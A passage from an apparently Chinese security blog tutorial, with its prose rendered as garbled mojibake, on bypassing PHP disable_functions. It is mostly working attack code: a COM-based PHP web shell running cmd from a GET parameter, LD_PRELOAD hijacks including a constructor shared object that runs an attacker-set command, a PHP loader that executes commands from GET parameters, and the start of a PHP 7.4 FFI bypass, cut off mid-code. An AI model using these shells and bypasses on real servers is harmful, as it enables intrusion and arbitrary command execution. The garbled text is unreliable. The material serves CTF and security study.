class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>] : <span class="string">&#x27;wscript&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;wscript&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Create Wscript.Shell Failed!&quot;</span>);</span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">    <span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">    <span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;application&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&quot;Shell.Application&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Shell.Application Failed!&quot;</span>);</span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">ShellExecute</span>(<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c &quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061652699.png" alt="image-20231206165205647"><br>è¿™ä¸ªåˆ©ç”¨çš„æ˜¯COMä¸‹çš„execç›´æ¥æ¥å‘½ä»¤æ‰§è¡Œï¼Œè‡³äºæ€ä¹ˆåˆ©ç”¨çš„å¯ä»¥å‚è€ƒ<a href="https://learn.microsoft.com/zh-cn/windows/win32/com/com-technical-overview">COM æŠ€æœ¯æ¦‚è¿° - Win32 apps | Microsoft Learn</a>æˆ‘è¿™é‡Œå°±ä¸ç ”ç©¶äº†</li></ul><h2 id="åˆ©ç”¨Linuxç¯å¢ƒå˜é‡LD-PRELOAD"><a href="#åˆ©ç”¨Linuxç¯å¢ƒå˜é‡LD-PRELOAD" class="headerlink" title="åˆ©ç”¨Linuxç¯å¢ƒå˜é‡LD_PRELOAD"></a>åˆ©ç”¨Linuxç¯å¢ƒå˜é‡LD_PRELOAD</h2><p>æ„Ÿè§‰è¿™ä¸ªæ˜¯é¢è¯•æˆ–è€…CTFé‡Œé¢è€ƒçš„æœ€å¤šçš„ï¼Œå…ˆçœ‹ä¸€ä¸‹LD_PRELOADæ˜¯ä»€ä¹ˆ<br>æ‘˜æŠ„ï¼Œæ„Ÿè§‰è§£é‡Šçš„æŒºå¥½</p><blockquote><p>LD_PRELOAD æ˜¯ä¸€ä¸ªå¯é€‰çš„ Unix ç¯å¢ƒå˜é‡ï¼ŒåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå…±äº«åº“æˆ–å…±äº«åº“çš„è·¯å¾„ï¼ŒåŠ è½½ç¨‹åºå°†åœ¨åŒ…å« C è¿è¡Œæ—¶åº“ï¼ˆlibc.soï¼‰çš„ä»»ä½•å…¶ä»–å…±äº«åº“ä¹‹å‰åŠ è½½è¯¥è·¯å¾„ã€‚è¿™ç§°ä¸ºé¢„åŠ è½½åº“ã€‚<br>ä¹Ÿå°±æ˜¯è¯´å®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚å³æˆ‘ä»¬å¯ä»¥è‡ªå·±ç”Ÿæˆä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“åŠ è½½ï¼Œä»¥è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ï¼Œä¹Ÿå¯ä»¥æ³¨å…¥æ¶æ„ç¨‹åºï¼Œæ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚</p></blockquote><p>å³LD_PRELOADæ˜¯è®¾ç½®ä½ æŸä¸ªç¨‹åºè¿è¡Œæ—¶å»å“ªåŠ è½½ä½ çš„åŠ¨æ€é“¾æ¥åº“çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œæ—¢ç„¶å¯ä»¥è‡ªå·±æŒ‡å®šè¿™ä¸ªè·¯å¾„é‚£ä¹ˆå°±æœ‰æ“ä½œçš„ç©ºé—´äº†ï¼Œå°±å¯ä»¥è‡ªå·±è®¾ç½®ä¸ªæ¶æ„çš„ç¨‹åºè·¯å¾„</p><p>åŠ¨æ€é“¾æ¥åº“åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Œç»§ç»­æ‘˜æŠ„</p><blockquote><p>ç®€å•æ¥è¯´ä¸€ä¸ªæ­£å¸¸ç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šè°ƒç”¨ä¸åŒçš„é“¾æ¥ï¼Œæ¯”å¦‚cï¼Œè°ƒç”¨hï¼Œä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨soï¼ˆwinçš„è¯å°±æ˜¯dllï¼‰ï¼Œè¿™äº›é“¾æ¥åº“å»ä½¿ç”¨ä»–ä»¬çš„åº“</p></blockquote><p>æ„Ÿè§‰å°±æ˜¯åœ¨è¿è¡ŒCæˆ–è€…pythonæ—¶ä½ æŒ‡å®šä¸€ä¸ªå¤´æ–‡ä»¶æˆ–è€…åº“ï¼Œç„¶åå°±å¯ä»¥è°ƒç”¨é‡Œé¢çš„å‡½æ•°ï¼ŒåŠ¨æ€å°±æ˜¯åœ¨ä½ è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶å»è°ƒç”¨ï¼Œè¿™æ ·ç†è§£åº”è¯¥æ²¡é”™<br>æ¦‚å¿µå·®ä¸å¤šäº†ï¼Œä¸‹é¢çœ‹æ€ä¹ˆåˆ©ç”¨è¿™ä¸ª</p><h3 id="åŸºæœ¬æ¼”ç¤º"><a href="#åŸºæœ¬æ¼”ç¤º" class="headerlink" title="åŸºæœ¬æ¼”ç¤º"></a>åŸºæœ¬æ¼”ç¤º</h3><h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p>è¿™é‡Œæ‹¿idå‘½ä»¤æ¥çœ‹ä¸€ä¸‹LD_PERLOADçš„åŸºæœ¬ç”¨æ³•å§<br>åˆ©ç”¨ä¸‹é¢å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹idåº•å±‚è°ƒç”¨äº†å“ªäº›å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws /usr/bin/id</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061652560.png" alt="image-20231206165223464"><br>å…¶ä¸­å°±ä½¿ç”¨äº†getuidè¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯æ‰¾äº†åŠå¤©è¿™ä¸ªå‡½æ•°çš„åŸæœ¬ä»£ç æ²¡æ‰¾åˆ°ï¼Œä¸çŸ¥é“æ€ä¹ˆæ‰¾ï¼Œéº»äº†ã€‚ã€‚ã€‚å…ˆæ”¾ç€ç»§ç»­å¾€ä¸‹<br>ä¸‹é¢ç”Ÿæˆä¸€ä¸ª.soæ–‡ä»¶ï¼Œå…ˆå†™ä¸ª.cåŸæœ¬çš„getuidå‡½æ•°åº”è¯¥ä¸æ˜¯è¿™æ ·çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getuid</span><span class="params">()</span>&#123;        </span><br><span class="line">  <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>)&#123;        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;        </span><br><span class="line">  &#125;        </span><br><span class="line">  unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);#è§£é™¤æ†ç»‘ï¼Œå¦åˆ™å®¹æ˜“å‡ºç°æ­»å¾ªç¯çš„å¥‡æ€ªçŠ¶å†µ        </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;success\n&quot;</span>);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç¼–è¯‘ä¸º.soæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC test.c -o test</span><br><span class="line">gcc --share test -o test.so</span><br></pre></td></tr></table></figure><p>å†è®¾ç½®ç¯å¢ƒå˜é‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD=./test.so</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œidå¯ä»¥çœ‹åˆ°printfå…ˆè¢«æ‰§è¡Œäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061653723.png" alt="image-20231206165347655"><br>å¼„å®Œè¿™ä¸ªä¹‹åæˆ‘çº ç»“äº†å¾ˆä¹…æ€ä¹ˆå»æ‰¾åˆ°getuidçš„æºç ï¼Œä½†åé¢å‘ç°å…¶å®ä¸æ‰¾åˆ°æºç ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºä½ å†™çš„é‚£ä¸ªgetuidå½“idå‘½ä»¤æ‰§è¡Œçš„æ—¶å€™å»åŠ è½½ä¸ä¼šç®¡ä½ é‡Œé¢æ€ä¹ˆæ‰§è¡Œçš„ï¼Œåªä¼šå»å¯¹åº”å‚æ•°ï¼Œå‚æ•°å†™å¯¹äº†å³å¯ï¼Œæ²¡å†™å¯¹çš„è¯æŠ¥é”™ä¹Ÿä¼šç»™ä½ æŠ¥å‡ºæ¥æ­£ç¡®çš„åº”è¯¥æ€ä¹ˆå†™ï¼Œå¦‚æ‰§è¡Œlsæ—¶è°ƒç”¨çš„<code>strncmp()</code>å‡½æ•°ï¼Œçœ‹ä¸‹é¢åšä¸»çš„å›¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061653257.png" alt="image-20231206165356149"></p><h3 id="å®æˆ˜phpä¸­æ€ä¹ˆåˆ©ç”¨"><a href="#å®æˆ˜phpä¸­æ€ä¹ˆåˆ©ç”¨" class="headerlink" title="å®æˆ˜phpä¸­æ€ä¹ˆåˆ©ç”¨"></a>å®æˆ˜phpä¸­æ€ä¹ˆåˆ©ç”¨</h3><p>ä¸Šé¢æ˜¯åœ¨æµ‹è¯•è¿™ä¸ªæ–¹æ³•çš„åŸºæœ¬ä½¿ç”¨ï¼Œåˆ©ç”¨çš„æ˜¯Linuxä¸­çš„idå‘½ä»¤ä¼šè°ƒç”¨çš„å¤–éƒ¨ç¨‹åºæ¥åšæµ‹è¯•ï¼Œä¸‹é¢å°±éœ€è¦å¯»æ‰¾åœ¨phpä¸­å“ªäº›å‡½æ•°ä¼šå¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œå³è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œåªè¦å¯åŠ¨æ–°è¿›ç¨‹å³å¯åˆ©ç”¨ï¼Œæ— æ‰€è°“æ˜¯å“ªä¸ªå‡½æ•°<br>æ ¹æ®å‰è¾ˆä»¬çš„ç»éªŒå¸¸ç”¨çš„æœ‰mail()ã€error_log()å‡½æ•°ï¼Œä¸¤ä¸ªå‡½æ•°åœ¨è°ƒç”¨æ—¶éƒ½ä¼šå¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹<code>/usr/sbin/sendmail</code>ï¼Œå½“ç„¶è¿™é‡Œsendmailé»˜è®¤æ˜¯æ²¡æœ‰å®‰è£…çš„ï¼Œå¯ä»¥è‡ªè¡Œå®‰è£…ä¸€ä¸‹<code>apt-get install sendmail</code>ï¼Œå¤±è´¥çš„è¯æ‰§è¡Œä¸€ä¸‹<code>apt-get update</code>å³å¯ï¼Œå¦å¤–imap_mail()å‡½æ•°ä¹Ÿä¼šå¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹å¤§æ¦‚ç‡ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œ</p><p>è¿™é‡Œå°±åªæµ‹è¯•mail()å‡½æ•°ï¼Œå®ƒå¯åŠ¨çš„æ–°è¿›ç¨‹ä¸­sendmailé‡Œé¢ä¹Ÿä¼šè°ƒç”¨getuidå‡½æ•°ï¼Œæ‰€ä»¥ç»§ç»­åŠ«æŒè¿™ä¸ªgetuidå³å¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061654263.png" alt="image-20231206165417218"><br>ç„¶åç¼–å†™ä¸ªmail.phpä»£ç å»è°ƒç”¨mailå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/home/joker27/tmp/test.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå’Œ.soæ–‡ä»¶æ”¾åœ¨ä¸€èµ·<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061654099.png" alt="image-20231206165434047"><br>ä¸Šé¢çš„.soæ–‡ä»¶æ”¹äº†ä¸€ä¸‹é‚£ä¸ªç”¨åœ¨è¿™é‡Œæ²¡æœ‰å›æ˜¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061654544.png" alt="image-20231206165443493"><br>ç„¶åç›´æ¥è®¿é—®mail.phpå³å¯æ‰§è¡Œä»£ç ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«ä¹Ÿå¯æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655303.png" alt="image-20231206165500254"><br>ç„¶åè¿™é‡Œå†è´´ä¸ªå¯ä»¥åˆ©ç”¨çš„å‡½æ•°æ€»ç»“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mail()</span><br><span class="line">error_log()</span><br><span class="line">mb_send_mail()éœ€è¦å®‰è£…mbstringæ¨¡å—ï¼Œåˆ©ç”¨ä¸mail()ç±»ä¼¼</span><br><span class="line">imap_mail()éœ€è¦å®‰è£…imapæ¨¡å—</span><br><span class="line">libvirt_connect()éœ€è¦libvirtæ¨¡å—</span><br><span class="line">gnupg_init()éœ€è¦gnupgæ¨¡å—</span><br></pre></td></tr></table></figure><p>æ‰¾äº†åŠå¤©ç»ˆäºæ‰¾åˆ°ä¸€ç¯‡åšå®¢ï¼Œé‡Œé¢ä¸€æ®µè¯è®©æˆ‘å¯¹è¿™ä¸ªè¿‡ç¨‹æ›´åŠ çš„æ¸…æ™°</p><blockquote><p>å½“ç³»ç»Ÿè¯•å›¾è°ƒç”¨æŸå‡½æ•°æ—¶ï¼Œè¯¥å‡½æ•°ä½äºç‰¹å®šçš„å…±äº«åº“(xxx.so)ã€‚å› æ­¤ï¼Œç³»ç»Ÿåœ¨è°ƒç”¨ä¹‹å‰å°†åŠ è½½xxx.soã€‚æ¢å¥è¯è¯´ï¼Œå¦‚æœæˆ‘å¯ä»¥åˆ›å»ºä¸€ä¸ªevil.soæœ‰äº†åŒåçš„å‡½æ•°ï¼Œå°±èƒ½å°†å…¶è¦†ç›–ä¹‹ã€‚</p></blockquote><p>ä¸Šé¢éƒ½æ˜¯åŠ«æŒçš„getuidè¿™ä¸ªå‡½æ•°ï¼Œéœ€è¦å¯åŠ¨çš„æ–°è¿›ç¨‹ä¸­æœ‰å‡½æ•°å»è°ƒç”¨å®ƒæ‰è¡Œï¼Œæœ‰ä¸€å®šçš„é™åˆ¶æ€§ï¼Œä¸‹é¢çœ‹æ€ä¹ˆçªç ´è¿™ä¸ªé™åˆ¶<br><strong>åŠ«æŒå…±äº«å¯¹è±¡</strong><br>å…±äº«å¯¹è±¡ï¼ˆShared Object, SOï¼‰å³.soæ–‡ä»¶ï¼Œä¸Šé¢çš„æ˜¯å½“mailå‡½æ•°å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ä¹‹åä¼šå».soæ–‡ä»¶å³å…±äº«å¯¹è±¡é‡Œé¢æ‰¾ä¸€äº›è¦è°ƒç”¨çš„å‡½æ•°ï¼Œæ‰¾åˆ°sendmailåsendmailé‡Œé¢å†å»è°ƒç”¨getuidå‡½æ•°ï¼Œä½†æ˜¯sendmailä¸ä¸€å®šä¼šå®‰è£…é‚£ä¹ˆåŠ«æŒgetuidä¹Ÿå°±æ²¡æœ‰ç”¨äº†ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•åœ¨åŠ è½½å…±äº«å¯¹è±¡æ—¶å°±èƒ½æ‰§è¡Œæ¶æ„ä»£ç ï¼Œç­”æ¡ˆè‚¯å®šæ˜¯æœ‰çš„ï¼Œåˆ©ç”¨<code>__attribute__((constructor))</code>å³å¯ï¼Œå®ƒå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <code>__attribute__((constructor))</code>ä¿®é¥°çš„å‡½æ•°<br>è¿™éƒ¨åˆ†çš„ä»£ç å°±ç›´æ¥ç”¨yangyangwithgnuè¿™ä½ä½¬çš„ä»£ç å°±è¡Œäº†<br>é¦–å…ˆæ˜¯.cæ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠè¿™ä¸ª.cç¼–è¯‘ä¸º.soæ–‡ä»¶å³å¯ï¼Œç„¶åæ˜¯åŠ è½½.soæ–‡ä»¶çš„phpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç æ¥æ”¶ä¸‰ä¸ªGETå‚æ•°ï¼Œä¸€æ˜¯ cmd å‚æ•°ï¼Œå¾…æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚ pwdï¼‰ï¼›äºŒæ˜¯ outpath å‚æ•°ï¼Œä¿å­˜å‘½ä»¤æ‰§è¡Œè¾“å‡ºç»“æœçš„æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚ &#x2F;tmp&#x2F;xxï¼‰ï¼Œä¾¿äºåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºï¼Œå¦å¤–å…³äºè¯¥å‚æ•°ï¼Œä½ åº”æ³¨æ„ web æ˜¯å¦æœ‰è¯»å†™æƒé™ã€web æ˜¯å¦å¯è·¨ç›®å½•è®¿é—®ã€æ–‡ä»¶å°†è¢«è¦†ç›–å’Œåˆ é™¤ç­‰å‡ ç‚¹ï¼›ä¸‰æ˜¯ sopath å‚æ•°ï¼ŒæŒ‡å®šåŠ«æŒç³»ç»Ÿå‡½æ•°çš„å…±äº«å¯¹è±¡çš„ç»å¯¹è·¯å¾„ï¼ˆå¦‚ &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.soï¼‰ï¼Œå¦å¤–å…³äºè¯¥å‚æ•°ï¼Œä½ åº”æ³¨æ„ web æ˜¯å¦å¯è·¨ç›®å½•è®¿é—®åˆ°å®ƒã€‚<br>ä¸‹é¢ä¸Šä¼ ä»£ç æµ‹è¯•ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655149.png" alt="image-20231206165528022"><br>æˆåŠŸç»•è¿‡æ‰§è¡Œï¼Œæ³¨æ„outpathåé¢çš„è·¯å¾„ä¸€å®šè¦å¯å†™æ‰è¡Œï¼Œè¿™ç§æ–¹å¼ä¹Ÿå¯ä»¥åœ¨awdä¸­å»åŠ«æŒ<code>lsã€cat</code>ç­‰å‘½ä»¤ï¼Œè®©ä»–åœ¨æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å°±æŠŠflagå‘ç»™ä½ äº†<br>[[LD_PRELOADåŠ«æŒ]]</p><h2 id="åˆ©ç”¨PHP7-4-FFIç»•è¿‡"><a href="#åˆ©ç”¨PHP7-4-FFIç»•è¿‡" class="headerlink" title="åˆ©ç”¨PHP7.4 FFIç»•è¿‡"></a>åˆ©ç”¨PHP7.4 FFIç»•è¿‡</h2><h3 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>PHP &gt;&#x3D; 7.4</li><li>å¼€å¯äº† FFI æ‰©å±•ä¸”<code>ffi.enable=true</code><br>ffi.enableé»˜è®¤æ˜¯æ²¡æœ‰å¼€å¯çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655200.png" alt="image-20231206165546145"><br>ç„¶åå»php.iniç»™å®ƒè®¾ç½®ä¸ºtrue<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655541.png" alt="image-20231206165555494"><br>ç„¶åé‡å¯ä¸€ä¸‹apacheå³å¯ç”Ÿæ•ˆï¼Œè®°å¾—é‡å¯ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡cè¯­è¨€çš„systemå»æ‰§è¡Œ,ç»•è¿‡disable functionsã€‚<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span 